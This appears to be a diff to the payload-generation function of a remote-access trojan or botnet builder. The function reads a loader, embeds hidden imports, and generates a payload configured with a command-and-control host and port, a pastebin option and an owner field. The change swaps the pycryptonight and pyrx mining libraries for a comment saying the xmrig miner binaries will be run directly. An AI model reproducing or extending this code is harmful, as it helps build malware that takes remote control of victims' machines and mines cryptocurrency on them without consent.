@@ -307,12 +307,10 @@ def _payload(options, **kwargs):
 
     loader  = open('core/loader.py','r').read()#, generators.loader(host=C2_HOST, port=int(C2_PORT)+2, packages=list(kwargs['hidden']))))
 
-    test_imports = '\n'.join(['import ' + i for i in list(kwargs['hidden']) if i not in ['StringIO','_winreg','pycryptonight','pyrx','ctypes']])
+    test_imports = '\n'.join(['import ' + i for i in list(kwargs['hidden']) if i not in ['StringIO','_winreg','ctypes']])
     potential_imports = '''
-try:
-    import pycryptonight
-    import pyrx
-except ImportError: pass
+# Instead of using pycryptonight and pyrx libraries, we'll use the xmrig binaries directly
+# This approach is more reliable and works across Python versions
 '''
 
     modules = '\n'.join(([open(module,'r').read().partition('# main')[2] for module in kwargs['modules']] + [generators.main('Payload', **{"host": C2_HOST, "port": C2_PORT, "pastebin": options.pastebin if options.pastebin else str(), "gui": "1" if options.gui else str(), "owner": options.owner}) + '_payload.run()']))
